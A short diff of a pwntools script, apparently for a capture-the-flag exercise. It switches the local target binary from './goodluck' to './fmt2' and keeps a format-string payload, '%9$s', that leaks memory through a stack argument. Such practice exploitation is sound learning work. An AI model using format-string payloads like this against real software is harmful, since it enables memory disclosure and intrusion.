@@ -3,7 +3,7 @@ from pwn import *
 context.log_level = 'debug'
 
 
-sh = process('./goodluck')
+sh = process('./fmt2')
 payload = "%9$s"
 print(payload)
 #gdb.attach(sh)
